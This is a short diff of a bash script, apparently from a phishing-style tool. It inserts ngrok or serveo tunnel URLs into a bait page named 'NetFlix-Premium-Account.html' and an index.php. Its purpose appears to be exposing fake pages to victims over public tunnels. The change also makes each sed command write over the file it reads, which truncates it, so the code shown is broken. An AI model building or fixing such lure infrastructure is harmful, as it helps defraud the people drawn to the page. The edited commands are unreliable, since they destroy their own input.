@@ -111,8 +111,8 @@ done
 payload_ngrok(){
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' .www/main.html > .www/NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$link'+g' .www/main.php > .www/index.php
+sed 's+forwarding_link+'$link'+g' .www/NetFlix-Premium-Account.html > .www/NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$link'+g' .www/index.php > .www/index.php
 
 }
 start_ngrok() {
@@ -148,8 +148,8 @@ payload_serveo() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .www/.servlink)
 
-sed 's+forwarding_link+'$send_link'+g' .www/main.html > .www/NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$send_link'+g' .www/main.php > .www/index.php
+sed 's+forwarding_link+'$send_link'+g' .www/NetFlix-Premium-Account.html > .www/NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$send_link'+g' .www/index.php > .www/index.php
 
 }
 start_serveo() {
